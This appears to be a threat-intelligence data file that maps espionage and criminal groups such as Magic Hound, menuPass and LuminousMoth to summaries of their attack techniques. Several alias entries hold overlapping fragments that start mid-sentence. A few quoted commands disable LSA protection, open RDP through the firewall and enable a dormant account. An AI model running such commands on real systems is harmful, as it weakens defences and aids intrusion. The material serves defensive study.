    "LuminousMoth": "LuminousMoth is a Chinese-speaking cyber espionage group that has been active since at least October 2020. LuminousMoth has targeted high-profile organizations, including government entities, in Myanmar, the Philippines, Thailand, and other parts of Southeast Asia. Some security researchers have concluded there is a connection between LuminousMoth and Mustang Panda based on similar targeting and TTPs, as well as network infrastructure overlaps., LuminousMoth has used ARP spoofing to redirect a compromised machine to an actor-controlled website., LuminousMoth has used HTTP for C2., LuminousMoth has manually archived stolen files from victim machines before exfiltration., LuminousMoth has used malicious DLLs that setup persistence in the Registry Key HKCU/Software/Microsoft/Windows/Current Version/Run., LuminousMoth has collected files and data from compromised machines., LuminousMoth has split archived files into multiple parts to bypass a 5MB limit., LuminousMoth has used unique malware for information theft and exfiltration., LuminousMoth has used malware that exfiltrates stolen data to its C2 server., LuminousMoth has exfiltrated data to Google Drive., LuminousMoth has used malware that scans for files in the Documents, Desktop, and Download folders and in other drives., LuminousMoth has used malware to store malicious binaries in hidden directories on victim's USB drives., LuminousMoth has used legitimate executables such as winword.exe and igfxem.exe to side-load their malware., LuminousMoth has downloaded additional malware and tools onto a compromised host., LuminousMoth has disguised their exfiltration malware as ZoomVideoApp.exe., LuminousMoth has used malware that adds Registry keys for persistence., LuminousMoth has obtained and used malware such as Cobalt Strike., LuminousMoth has obtained an ARP spoofing tool from GitHub., LuminousMoth has used a valid digital certificate for some of their malware. , LuminousMoth has sent spearphishing emails containing a malicious Dropbox download link., LuminousMoth has used malicious DLLs to spread malware to connected removable USB drives on infected machines., LuminousMoth has created scheduled tasks to establish persistence for their tools., LuminousMoth has hosted malicious payloads on Dropbox., LuminousMoth has redirected compromised machines to an actor-controlled webpage through HTML injection., LuminousMoth has created a link to a Dropbox file that has been used in their spear-phishing operations., LuminousMoth has used an unnamed post-exploitation tool to steal cookies from the Chrome browser., LuminousMoth has signed their malware with a valid digital signature., LuminousMoth has used a malicious DLL to collect the username from compromised hosts., LuminousMoth has lured victims into clicking malicious Dropbox download links delivered through spearphishing.",
    "Machete": "Machete is a suspected Spanish-speaking cyber espionage group that has been active since at least 2010. It has primarily focused its operations within Latin America, with a particular emphasis on Venezuela, but also in the US, Europe, Russia, and parts of Asia. Machete generally targets high-profile organizations such as government institutions, intelligence services, and military units, as well as telecommunications and power companies., , , Machete has used batch files to initiate additional downloads of malicious files., Machete has embedded malicious macros within spearphishing attachments to download additional files., Machete used multiple compiled Python scripts on the victim’s system. Machete's main backdoor Machete is also written in Python., Machete has distributed Machete through a fake blog website., Machete's Machete MSI installer has masqueraded as a legitimate Adobe Acrobat Reader installer., Machete has delivered spearphishing emails that contain a zipped file with malicious contents., Machete has sent phishing emails that contain a link to an external server with ZIP and RAR archives., Machete has created scheduled tasks to maintain Machete's persistence., Machete has used msiexec to install the Machete malware., Machete has has relied on users opening malicious links delivered through spearphishing to execute malware., Machete has relied on users opening malicious attachments delivered through spearphishing to execute malware.",
    "Magic Hound": "Magic Hound is an Iranian-sponsored threat group that conducts long term, resource-intensive cyber espionage operations, likely on behalf of the Islamic Revolutionary Guard Corps. They have targeted European, U.S., and Middle Eastern government and military personnel, academics, journalists, and organizations such as the World Health Organization (WHO), via complex social engineering campaigns since at least 2014., , , , , , Link analysis of infrastructure and tools revealed a potential relationship between Magic Hound and the older attack campaign called Newscaster (aka Newscasters)., , , Magic Hound has used Powershell to discover email accounts., Magic Hound granted compromised email accounts read access to the email boxes of additional targeted accounts. The group then was able to authenticate to the intended victim's OWA (Outlook Web Access) portal and read hundreds of email communications for information on Middle East organizations. , Magic Hound has added a user named DefaultAccount to the Administrators and Remote Desktop Users groups., Magic Hound has registered fraudulent domains such as 'mail-newyorker.com' and 'news12.com.recover-session-service.site' to target specific victims with phishing attacks., Magic Hound has acquired Amazon S3 buckets to use in C2., Magic Hound has conducted widespread scanning to identify public-facing systems vulnerable to CVE-2021-44228 in Log4j and ProxyShell vulnerabilities; CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in on-premises MS Exchange Servers; and CVE-2018-13379 in Fortinet FortiOS SSL VPNs., Magic Hound malware has used IRC for C2., Magic Hound has used HTTP for C2., Magic Hound has used gzip to archive dumped LSASS process memory and RAR to stage and compress local folders., Magic Hound malware has used Registry Run keys to establish persistence., Magic Hound has used PowerShell for execution and privilege escalation., Magic Hound has used the command-line interface for code execution., Magic Hound malware has used VBS scripts for execution., Magic Hound has compromised personal email accounts through the use of legitimate credentials and gathered additional victim information., Magic Hound has used compromised domains to host links targeted to specific phishing victims., Magic Hound has created local accounts named help and DefaultAccount on compromised machines., Magic Hound has used BitLocker and DiskCryptor to encrypt targeted workstations. , Magic Hound has used a web shell to exfiltrate a ZIP file containing a dump of LSASS memory on a compromised machine., Magic Hound has used a web shell to execute nltest /trusted_domains to identify trust relationships., Magic Hound has conducted watering-hole attacks through media and magazine websites., Magic Hound has compromised email credentials in order to steal sensitive data., Magic Hound has collected .PST archives., Magic Hound has exported emails from compromised Exchange servers including through use of the cmdlet New-MailboxExportRequest., Magic Hound has used an encrypted http proxy in C2 communications., Magic Hound has created fake LinkedIn and other social media accounts to contact targets and convince them--through messages and voice communications--to open malicious links., Magic Hound has established email accounts using fake personas for spearphishing operations., Magic Hound has used the Telegram API sendMessage to relay data on compromised devices., Magic Hound has exploited the Log4j utility (CVE-2021-44228), on-premises MS Exchange servers via 'ProxyShell' (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207), and Fortios SSL VPNs (CVE-2018-13379)., Magic Hound malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents., Magic Hound has captured the user-agent strings from visitors to their phishing sites., Magic Hound has acquired mobile phone numbers of potential targets, possibly for mobile malware or additional phishing operations., Magic Hound gathered credentials from two victims that they then attempted to validate across 75 different websites. Magic Hound has also collected credentials from over 900 Fortinet VPN servers in the US, Europe, and Israel., Magic Hound has identified high-value email accounts in academia, journalism, NGO's, foreign policy, and national security for targeting., Magic Hound has captured the IP addresses of visitors to their phishing sites., Magic Hound has collected location information from visitors to their phishing sites., Magic Hound malware has a function to determine whether the C2 server wishes to execute the newly dropped file in a hidden window., Magic Hound has disabled LSA protection on compromised hosts using 'reg' add HKLM/SYSTEM/CurrentControlSet/Control/LSA /v RunAsPPL /t REG_DWORD /d 0 /f., Magic Hound has disabled antivirus services on targeted systems in order to upload malicious payloads., Magic Hound has executed scripts to disable the event log service., Magic Hound has added the following rule to a victim's Windows firewall to allow RDP traffic - 'netsh' advfirewall firewall add rule name='Terminal Server' dir=in action=allow protocol=TCP localport=3389., Magic Hound has removed mailbox export requests from compromised Exchange servers., Magic Hound has deleted and overwrote files to cover tracks., Magic Hound has downloaded additional code and files from servers onto victims., Magic Hound malware is capable of keylogging., Magic Hound has copied tools within a compromised network using RDP., Magic Hound has named a malicious script CacheTask.bat to mimic a legitimate task., Magic Hound has used dllhost.exe to mask Fast Reverse Proxy (FRP) and MicrosoftOutLookUpdater.exe for Plink., Magic Hound has created local accounts named help and DefaultAccount on compromised machines., Magic Hound has modified Registry settings for security tools., Magic Hound has used KPortScan 3.0 to perform SMB, RDP, and LDAP scanning., Magic Hound malware has communicated with its C2 server over TCP ports 4443 and 10151 using HTTP., Magic Hound has used base64-encoded commands., Magic Hound malware has used base64-encoded files and has also encrypted embedded strings with AES., Magic Hound has obtained and used tools like Havij, sqlmap, Metasploit, Mimikatz, and Plink., Magic Hound has stolen domain credentials by dumping LSASS process memory using Task Manager, comsvcs.dll, and from a Microsoft Active Directory Domain Controller using Mimikatz., Magic Hound has sent malicious URL links through email to victims. In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to download Pupy., Magic Hound used various social media channels (such as LinkedIn) as well as messaging services (such as WhatsApp) to spearphish victims., Magic Hound has used SMS and email messages with links designed to steal credentials or track victims., Magic Hound malware can list running processes., Magic Hound has used Plink to tunnel RDP over SSH., Magic Hound has used Fast Reverse Proxy (FRP) for RDP traffic., Magic Hound has used Remote Desktop Services to copy tools on targeted systems., Magic Hound has used Ping for discovery on targeted networks., Magic Hound has used scheduled tasks to establish persistence and execution., Magic Hound malware can take a screenshot and upload the file to its C2 server., Magic Hound has used multiple web shells to gain execution., Magic Hound has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory., Magic Hound malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server., Magic Hound malware gathers the victim's local IP address, MAC address, and external IP address., Magic Hound has conducted a network call out to a specific website as part of their initial discovery activity. , Magic Hound has collected names and passwords of all Wi-Fi networks to which a device has previously connected., Magic Hound has used quser.exe to identify existing RDP connections., Magic Hound malware has obtained the victim username and sent it to the C2 server., Magic Hound has attempted to lure victims into opening malicious links embedded in emails., Magic Hound has attempted to lure victims into opening malicious email attachments., Magic Hound enabled and used the default system managed account, DefaultAccount, via 'powershell.exe' /c net user DefaultAccount /active:yes to connect to a targeted Exchange server over RDP., Magic Hound has used domain administrator accounts after dumping LSASS process memory., Magic Hound malware can use a SOAP Web service to communicate with its C2 server., Magic Hound has used a tool to run cmd /c wmic computersystem get domain for discovery.",
    "TA453": "The group then was able to authenticate to the intended victim's OWA (Outlook Web Access) portal and read hundreds of email communications for information on Middle East organizations. , Magic Hound has added a user named DefaultAccount to the Administrators and Remote Desktop Users groups., Magic Hound has registered fraudulent domains such as 'mail-newyorker.com' and 'news12.com.recover-session-service.site' to target specific victims with phishing attacks., Magic Hound has acquired Amazon S3 buckets to use in C2., Magic Hound has conducted widespread scanning to identify public-facing systems vulnerable to CVE-2021-44228 in Log4j and ProxyShell vulnerabilities; CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in on-premises MS Exchange Servers; and CVE-2018-13379 in Fortinet FortiOS SSL VPNs., Magic Hound malware has used IRC for C2., Magic Hound has used HTTP for C2., Magic Hound has used gzip to archive dumped LSASS process memory and RAR to stage and compress local folders., Magic Hound malware has used Registry Run keys to establish persistence., Magic Hound has used PowerShell for execution and privilege escalation., Magic Hound has used the command-line interface for code execution., Magic Hound malware has used VBS scripts for execution., Magic Hound has compromised personal email accounts through the use of legitimate credentials and gathered additional victim information., Magic Hound has used compromised domains to host links targeted to specific phishing victims., Magic Hound has created local accounts named help and DefaultAccount on compromised machines., Magic Hound has used BitLocker and DiskCryptor to encrypt targeted workstations. , Magic Hound has used a web shell to exfiltrate a ZIP file containing a dump of LSASS memory on a compromised machine., Magic Hound has used a web shell to execute nltest /trusted_domains to identify trust relationships., Magic Hound has conducted watering-hole attacks through media and magazine websites., Magic Hound has compromised email credentials in order to steal sensitive data., Magic Hound has collected .PST archives., Magic Hound has exported emails from compromised Exchange servers including through use of the cmdlet New-MailboxExportRequest.",
    "COBALT ILLUSION": "Magic Hound has used gzip to archive dumped LSASS process memory and RAR to stage and compress local folders., Magic Hound malware has used Registry Run keys to establish persistence., Magic Hound has used PowerShell for execution and privilege escalation., Magic Hound has used the command-line interface for code execution., Magic Hound malware has used VBS scripts for execution., Magic Hound has compromised personal email accounts through the use of legitimate credentials and gathered additional victim information., Magic Hound has used compromised domains to host links targeted to specific phishing victims., Magic Hound has created local accounts named help and DefaultAccount on compromised machines., Magic Hound has used BitLocker and DiskCryptor to encrypt targeted workstations. , Magic Hound has used a web shell to exfiltrate a ZIP file containing a dump of LSASS memory on a compromised machine., Magic Hound has used a web shell to execute nltest /trusted_domains to identify trust relationships., Magic Hound has conducted watering-hole attacks through media and magazine websites., Magic Hound has compromised email credentials in order to steal sensitive data., Magic Hound has collected .PST archives., Magic Hound has exported emails from compromised Exchange servers including through use of the cmdlet New-MailboxExportRequest., Magic Hound has used an encrypted http proxy in C2 communications., Magic Hound has created fake LinkedIn and other social media accounts to contact targets and convince them--through messages and voice communications--to open malicious links., Magic Hound has established email accounts using fake personas for spearphishing operations., Magic Hound has used the Telegram API sendMessage to relay data on compromised devices., Magic Hound has exploited the Log4j utility (CVE-2021-44228), on-premises MS Exchange servers via 'ProxyShell' (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207), and Fortios SSL VPNs (CVE-2018-13379)., Magic Hound malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices.",
    "Charming Kitten": "Magic Hound has established email accounts using fake personas for spearphishing operations., Magic Hound has used the Telegram API sendMessage to relay data on compromised devices., Magic Hound has exploited the Log4j utility (CVE-2021-44228), on-premises MS Exchange servers via 'ProxyShell' (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207), and Fortios SSL VPNs (CVE-2018-13379)., Magic Hound malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents., Magic Hound has captured the user-agent strings from visitors to their phishing sites., Magic Hound has acquired mobile phone numbers of potential targets, possibly for mobile malware or additional phishing operations., Magic Hound gathered credentials from two victims that they then attempted to validate across 75 different websites. Magic Hound has also collected credentials from over 900 Fortinet VPN servers in the US, Europe, and Israel., Magic Hound has identified high-value email accounts in academia, journalism, NGO's, foreign policy, and national security for targeting., Magic Hound has captured the IP addresses of visitors to their phishing sites., Magic Hound has collected location information from visitors to their phishing sites., Magic Hound malware has a function to determine whether the C2 server wishes to execute the newly dropped file in a hidden window., Magic Hound has disabled LSA protection on compromised hosts using 'reg' add HKLM/SYSTEM/CurrentControlSet/Control/LSA /v RunAsPPL /t REG_DWORD /d 0 /f., Magic Hound has disabled antivirus services on targeted systems in order to upload malicious payloads., Magic Hound has executed scripts to disable the event log service., Magic Hound has added the following rule to a victim's Windows firewall to allow RDP traffic - 'netsh' advfirewall firewall add rule name='Terminal Server' dir=in action=allow protocol=TCP localport=3389., Magic Hound has removed mailbox export requests from compromised Exchange servers., Magic Hound has deleted and overwrote files to cover tracks., Magic Hound has downloaded additional code and files from servers onto victims., Magic Hound malware is capable of keylogging.",
    "ITG18": "Magic Hound gathered credentials from two victims that they then attempted to validate across 75 different websites. Magic Hound has also collected credentials from over 900 Fortinet VPN servers in the US, Europe, and Israel., Magic Hound has identified high-value email accounts in academia, journalism, NGO's, foreign policy, and national security for targeting., Magic Hound has captured the IP addresses of visitors to their phishing sites., Magic Hound has collected location information from visitors to their phishing sites., Magic Hound malware has a function to determine whether the C2 server wishes to execute the newly dropped file in a hidden window., Magic Hound has disabled LSA protection on compromised hosts using 'reg' add HKLM/SYSTEM/CurrentControlSet/Control/LSA /v RunAsPPL /t REG_DWORD /d 0 /f., Magic Hound has disabled antivirus services on targeted systems in order to upload malicious payloads., Magic Hound has executed scripts to disable the event log service., Magic Hound has added the following rule to a victim's Windows firewall to allow RDP traffic - 'netsh' advfirewall firewall add rule name='Terminal Server' dir=in action=allow protocol=TCP localport=3389., Magic Hound has removed mailbox export requests from compromised Exchange servers., Magic Hound has deleted and overwrote files to cover tracks., Magic Hound has downloaded additional code and files from servers onto victims., Magic Hound malware is capable of keylogging., Magic Hound has copied tools within a compromised network using RDP., Magic Hound has named a malicious script CacheTask.bat to mimic a legitimate task., Magic Hound has used dllhost.exe to mask Fast Reverse Proxy (FRP) and MicrosoftOutLookUpdater.exe for Plink., Magic Hound has created local accounts named help and DefaultAccount on compromised machines., Magic Hound has modified Registry settings for security tools., Magic Hound has used KPortScan 3.0 to perform SMB, RDP, and LDAP scanning., Magic Hound malware has communicated with its C2 server over TCP ports 4443 and 10151 using HTTP., Magic Hound has used base64-encoded commands., Magic Hound malware has used base64-encoded files and has also encrypted embedded strings with AES., Magic Hound has obtained and used tools like Havij, sqlmap, Metasploit, Mimikatz, and Plink., Magic Hound has stolen domain credentials by dumping LSASS process memory using Task Manager, comsvcs.dll, and from a Microsoft Active Directory Domain Controller using Mimikatz., Magic Hound has sent malicious URL links through email to victims. In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to download Pupy., Magic Hound used various social media channels (such as LinkedIn) as well as messaging services (such as WhatsApp) to spearphish victims., Magic Hound has used SMS and email messages with links designed to steal credentials or track victims.",
    "Phosphorus": "Magic Hound has used KPortScan 3.0 to perform SMB, RDP, and LDAP scanning., Magic Hound malware has communicated with its C2 server over TCP ports 4443 and 10151 using HTTP., Magic Hound has used base64-encoded commands., Magic Hound malware has used base64-encoded files and has also encrypted embedded strings with AES., Magic Hound has obtained and used tools like Havij, sqlmap, Metasploit, Mimikatz, and Plink., Magic Hound has stolen domain credentials by dumping LSASS process memory using Task Manager, comsvcs.dll, and from a Microsoft Active Directory Domain Controller using Mimikatz., Magic Hound has sent malicious URL links through email to victims. In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to download Pupy., Magic Hound used various social media channels (such as LinkedIn) as well as messaging services (such as WhatsApp) to spearphish victims., Magic Hound has used SMS and email messages with links designed to steal credentials or track victims., Magic Hound malware can list running processes., Magic Hound has used Plink to tunnel RDP over SSH., Magic Hound has used Fast Reverse Proxy (FRP) for RDP traffic., Magic Hound has used Remote Desktop Services to copy tools on targeted systems., Magic Hound has used Ping for discovery on targeted networks., Magic Hound has used scheduled tasks to establish persistence and execution., Magic Hound malware can take a screenshot and upload the file to its C2 server., Magic Hound has used multiple web shells to gain execution., Magic Hound has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory., Magic Hound malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server., Magic Hound malware gathers the victim's local IP address, MAC address, and external IP address., Magic Hound has conducted a network call out to a specific website as part of their initial discovery activity. , Magic Hound has collected names and passwords of all Wi-Fi networks to which a device has previously connected., Magic Hound has used quser.exe to identify existing RDP connections., Magic Hound malware has obtained the victim username and sent it to the C2 server., Magic Hound has attempted to lure victims into opening malicious links embedded in emails., Magic Hound has attempted to lure victims into opening malicious email attachments., Magic Hound enabled and used the default system managed account, DefaultAccount, via 'powershell.exe' /c net user DefaultAccount /active:yes to connect to a targeted Exchange server over RDP., Magic Hound has used domain administrator accounts after dumping LSASS process memory., Magic Hound malware can use a SOAP Web service to communicate with its C2 server., Magic Hound has used a tool to run cmd /c wmic computersystem get domain for discovery.",
    "Malteiro": "Malteiro is a financially motivated criminal group that is likely based in Brazil and has been active since at least November 2019. The group operates and distributes the Mispadu  banking trojan via a Malware-as-a-Service (MaaS) business model. Malteiro mainly targets victims throughout Latin America (particularly Mexico) and Europe (particularly Spain and Portugal)., Malteiro has utilized a dropper containing malicious VBS scripts., Malteiro has obtained credentials from mail clients via NirSoft MailPassView., Malteiro has stolen credentials stored in the victim’s browsers via software tool NirSoft WebBrowserPassView., Malteiro has the ability to deobfuscate downloaded files prior to execution., Malteiro targets organizations in a wide variety of sectors via the use of Mispadu banking trojan with the goal of financial theft., Malteiro has used scripts encoded in Base64 certificates to distribute malware to victims., Malteiro has sent spearphishing emails containing malicious .zip files., Malteiro has injected Mispadu’s DLL into a process., Malteiro collects the installed antivirus on the victim machine., Malteiro collects the machine information, system architecture, the OS version, computer name, and Windows product name., Malteiro will terminate Mispadu's infection process if the language of the victim machine is not Spanish or Portuguese., Malteiro has relied on users to execute .zip file attachments containing malicious URLs.",
    "menuPass": "menuPass is a threat group that has been active since at least 2006. Individual members of menuPass are known to have acted in association with the Chinese Ministry of State Security's (MSS) Tianjin State Security Bureau and worked for the Huaying Haitai Science and Technology Development Company., menuPass has targeted healthcare, defense, aerospace, finance, maritime, biotechnology, energy, and government sectors globally, with an emphasis on Japanese organizations. In 2016 and 2017, the group is known to have targeted managed IT service providers (MSPs), manufacturing and mining companies, and a university., , , , , , , , , menuPass has used the Microsoft administration tool csvde.exe to export Active Directory data., menuPass has registered malicious domains for use in intrusion campaigns., menuPass has encrypted files and information before exfiltration., menuPass has compressed files before exfiltration using TAR and RAR., menuPass has used the Csvde tool to collect Active Directory files and data., menuPass uses PowerSploit to inject shellcode into PowerShell., menuPass executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands. menuPass has used malicious macros embedded inside Office documents to execute files., menuPass has collected various files from the compromised computers., menuPass has collected data from remote systems by mounting network shares with net use and using Robocopy to transfer data., menuPass stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin., menuPass has staged data on remote MSP systems or other victim networks prior to exfiltration., menuPass has used certutil in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also used certutil -decode to decode files on the victim’s machine when dropping UPPERCUT., menuPass has used dynamic DNS service providers to host malicious domains., menuPass has leveraged vulnerabilities in Pulse Secure VPNs to hijack sessions., menuPass has used tools to exploit the ZeroLogon vulnerability (CVE-2020-1472)., menuPass has searched compromised systems for folders of interest including those related to HR, audit and expense, and meeting memos., menuPass has used DLL search order hijacking., menuPass has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as UPPERCUT., menuPass has used Wevtutil to remove PowerShell execution logs., A menuPass macro deletes files after it has decoded and decompressed them., menuPass has installed updates and new malware on victims., menuPass has used key loggers to steal usernames and passwords., menuPass has used esentutl to change file extensions to their true type that were masquerading as .txt files. , menuPass has renamed certutil and moved it to a different location on the system to avoid detection based on use of the tool., menuPass has been seen changing malicious files to appear legitimate., menuPass has used native APIs including GetModuleFileName, lstrcat, CreateFile, and ReadFile., menuPass has used tcping.exe, similar to Ping, to probe port status on systems of interest., menuPass has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40., menuPass has used and modified open-source tools like Impacket, Mimikatz, and pwdump., menuPass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials., menuPass has used Ntdsutil to dump credentials., menuPass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials., menuPass has sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents., menuPass has used process hollowing in iexplore.exe to load the RedLeaves implant., menuPass has used a global service provider's IP as a proxy for C2 traffic from a victim., menuPass has used RDP connections to move across the victim network., menuPass has used Putty Secure Copy Client (PSCP) to transfer data., menuPass uses scripts to enumerate IP ranges on the victim network. menuPass has also issued the command net view /domain to a PlugX implant to gather information about remote systems on the network., menuPass has used a script (atexec.py) to execute a command on a target machine via Task Scheduler., menuPass has resized and added data to the certificate table to enable the signing of modified files with legitimate signatures., menuPass has used InstallUtil.exe to execute malicious software., menuPass has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions., menuPass has used net use to conduct connectivity checks to machines., menuPass has used legitimate access granted to Managed Service Providers in order to access victims of interest., menuPass has attempted to get victims to open malicious files such as Windows Shortcuts (.lnk) and/or Microsoft Office documents, sent via email as part of spearphishing campaigns., menuPass has used valid accounts including shared between Managed Service Providers and clients to move between the two environments., menuPass has used a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.",
    "Cicada": "menuPass has targeted healthcare, defense, aerospace, finance, maritime, biotechnology, energy, and government sectors globally, with an emphasis on Japanese organizations. In 2016 and 2017, the group is known to have targeted managed IT service providers (MSPs), manufacturing and mining companies, and a university., , , , , , , , , menuPass has used the Microsoft administration tool csvde.exe to export Active Directory data., menuPass has registered malicious domains for use in intrusion campaigns., menuPass has encrypted files and information before exfiltration., menuPass has compressed files before exfiltration using TAR and RAR., menuPass has used the Csvde tool to collect Active Directory files and data., menuPass uses PowerSploit to inject shellcode into PowerShell., menuPass executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands. menuPass has used malicious macros embedded inside Office documents to execute files., menuPass has collected various files from the compromised computers., menuPass has collected data from remote systems by mounting network shares with net use and using Robocopy to transfer data., menuPass stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin., menuPass has staged data on remote MSP systems or other victim networks prior to exfiltration.",
    "POTASSIUM": " menuPass has used dynamic DNS service providers to host malicious domains., menuPass has leveraged vulnerabilities in Pulse Secure VPNs to hijack sessions., menuPass has used tools to exploit the ZeroLogon vulnerability (CVE-2020-1472)., menuPass has searched compromised systems for folders of interest including those related to HR, audit and expense, and meeting memos., menuPass has used DLL search order hijacking., menuPass has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as UPPERCUT., menuPass has used Wevtutil to remove PowerShell execution logs., A menuPass macro deletes files after it has decoded and decompressed them., menuPass has installed updates and new malware on victims., menuPass has used key loggers to steal usernames and passwords., menuPass has used esentutl to change file extensions to their true type that were masquerading as .txt files. , menuPass has renamed certutil and moved it to a different location on the system to avoid detection based on use of the tool., menuPass has been seen changing malicious files to appear legitimate., menuPass has used native APIs including GetModuleFileName, lstrcat, CreateFile, and ReadFile., menuPass has used tcping.exe, similar to Ping, to probe port status on systems of interest., menuPass has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40., menuPass has used and modified open-source tools like Impacket, Mimikatz, and pwdump., menuPass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials., menuPass has used Ntdsutil to dump credentials.",
    "APT10": "The group has used a modified version of pentesting script wmiexec.vbs to execute commands. menuPass has used malicious macros embedded inside Office documents to execute files., menuPass has collected various files from the compromised computers., menuPass has collected data from remote systems by mounting network shares with net use and using Robocopy to transfer data., menuPass stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin., menuPass has staged data on remote MSP systems or other victim networks prior to exfiltration., menuPass has used certutil in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also used certutil -decode to decode files on the victim’s machine when dropping UPPERCUT., menuPass has used dynamic DNS service providers to host malicious domains., menuPass has leveraged vulnerabilities in Pulse Secure VPNs to hijack sessions., menuPass has used tools to exploit the ZeroLogon vulnerability (CVE-2020-1472)., menuPass has searched compromised systems for folders of interest including those related to HR, audit and expense, and meeting memos., menuPass has used DLL search order hijacking., menuPass has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as UPPERCUT., menuPass has used Wevtutil to remove PowerShell execution logs., A menuPass macro deletes files after it has decoded and decompressed them., menuPass has installed updates and new malware on victims., menuPass has used key loggers to steal usernames and passwords., menuPass has used esentutl to change file extensions to their true type that were masquerading as .txt files. , menuPass has renamed certutil and moved it to a different location on the system to avoid detection based on use of the tool., menuPass has been seen changing malicious files to appear legitimate., menuPass has used native APIs including GetModuleFileName, lstrcat, CreateFile, and ReadFile., menuPass has used tcping.exe, similar to Ping, to probe port status on systems of interest., menuPass has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40., menuPass has used and modified open-source tools like Impacket, Mimikatz, and pwdump., menuPass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.",
    "Stone Panda": "menuPass has used native APIs including GetModuleFileName, lstrcat, CreateFile, and ReadFile., menuPass has used tcping.exe, similar to Ping, to probe port status on systems of interest., menuPass has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40., menuPass has used and modified open-source tools like Impacket, Mimikatz, and pwdump., menuPass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials., menuPass has used Ntdsutil to dump credentials., menuPass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials., menuPass has sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents., menuPass has used process hollowing in iexplore.exe to load the RedLeaves implant., menuPass has used a global service provider's IP as a proxy for C2 traffic from a victim., menuPass has used RDP connections to move across the victim network., menuPass has used Putty Secure Copy Client (PSCP) to transfer data., menuPass uses scripts to enumerate IP ranges on the victim network. menuPass has also issued the command net view /domain to a PlugX implant to gather information about remote systems on the network., menuPass has used a script (atexec.py) to execute a command on a target machine via Task Scheduler., menuPass has resized and added data to the certificate table to enable the signing of modified files with legitimate signatures., menuPass has used InstallUtil.exe to execute malicious software., menuPass has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions., menuPass has used net use to conduct connectivity checks to machines., menuPass has used legitimate access granted to Managed Service Providers in order to access victims of interest., menuPass has attempted to get victims to open malicious files such as Windows Shortcuts (.lnk) and/or Microsoft Office documents, sent via email as part of spearphishing campaigns., menuPass has used valid accounts including shared between Managed Service Providers and clients to move between the two environments., menuPass has used a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.",
    "Metador": "Metador is a suspected cyber espionage group that was first reported in September 2022. Metador has targeted a limited number of telecommunication companies, internet service providers, and universities in the Middle East and Africa. Security researchers named the group Metador based on the 'I am meta' string in one of the group's malware samples and the expectation of Spanish-language responses from C2 servers., Metador has used HTTP for C2., Metador has used the Windows command line to execute commands., Metador has established persistence through the use of a WMI event subscription combined with unusual living-off-the-land binaries such as cdb.exe., Metador has quickly deleted cbd.exe from a compromised host following the successful deployment of their malware. , Metador has downloaded tools and malware onto a compromised system., Metador has used TCP for C2., Metador has encrypted their payloads., Metador has used unique malware in their operations, including metaMain and Mafalda., Metador has used Microsoft's Console Debugger in some of their operations.",
    "Moafee": "Moafee is a threat group that appears to operate from the Guandong Province of China. Due to overlapping TTPs, including similar custom tools, Moafee is thought to have a direct or indirect relationship with the threat group DragonOK. , Moafee has been known to employ binary padding.",
    "Mofang": "Mofang is a likely China-based cyber espionage group, named for its frequent practice of imitating a victim's infrastructure. This adversary has been observed since at least May 2012 conducting focused attacks against government and critical infrastructure in Myanmar, as well as several other countries and sectors including military, automobile, and weapons industries., Mofang has compressed the ShimRat executable within malicious email attachments. Mofang has also encrypted payloads before they are downloaded to victims., Mofang delivered spearphishing emails with malicious documents, PDFs, or Excel files attached., Mofang delivered spearphishing emails with malicious links included., Mofang's spearphishing emails required a user to click the link to connect to a compromised website., Mofang's malicious spearphishing attachments required a user to open the file after receiving.",
